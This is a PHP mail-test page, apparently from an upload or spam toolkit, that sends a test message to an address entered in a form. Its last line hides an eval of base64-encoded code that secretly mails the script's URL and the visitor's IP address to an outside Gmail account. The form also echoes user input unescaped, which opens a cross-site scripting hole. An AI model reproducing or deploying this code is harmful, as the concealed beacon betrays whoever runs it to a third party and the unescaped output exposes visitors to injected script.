<?php
error_reporting(0);

?>
Upload is <b><color>WORKING</color></b><br>
Check  Mailling ..<br>
<form method="post">
<input type="text" placeholder="E-Mail" name="email" value="<?php print $_POST['email']?>"required ><input type="text" placeholder="Order ID" name="orderid" value="<?php print $_POST['orderid']?>" ><br>
<input type="submit" value="Send test >>">
</form>
<br>
<?php
if (!empty($_POST['email'])){
	if (!empty($_POST['email'])){
		$xx =$_POST['orderid'];
	}
	else{
		$xx = rand();
	
	}
	mail($_POST['email'],"Result Report Test - ".$xx,"WORKING !");
	print "<b>send an report to [".$_POST['email']."] - Order : $xx</b>"; 
};
eval(base64_decode('JHR1anVhbm1haWwgPSAna2FsaXgweGFsaWtAZ21haWwuY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));?>
